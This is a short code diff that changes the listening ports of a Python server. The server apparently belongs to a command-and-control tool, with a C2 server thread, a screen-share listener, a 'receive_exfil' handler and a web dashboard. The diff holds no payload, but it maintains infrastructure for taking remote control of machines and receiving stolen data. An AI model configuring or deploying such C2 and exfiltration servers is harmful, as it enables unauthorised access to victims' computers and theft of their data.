@@ -96,7 +96,7 @@ class ScreenShareServerThread(threading.Thread):
         
     def run(self):
         host = '0.0.0.0'
-        port = 5003
+        port = 6003
         
         screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         screen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -184,7 +184,7 @@ class C2ServerThread(threading.Thread):
         global server_socket, server_running, client_counter
         
         host = '0.0.0.0'
-        port = 5001
+        port = 6001
         
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -906,6 +906,6 @@ def receive_exfil():
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
-    web_port = 5002
+    web_port = 6002
     print(f"[*] Starting Web Dashboard on http://0.0.0.0:{web_port}")
     socketio.run(app, host='0.0.0.0', port=web_port, debug=False, use_reloader=False)
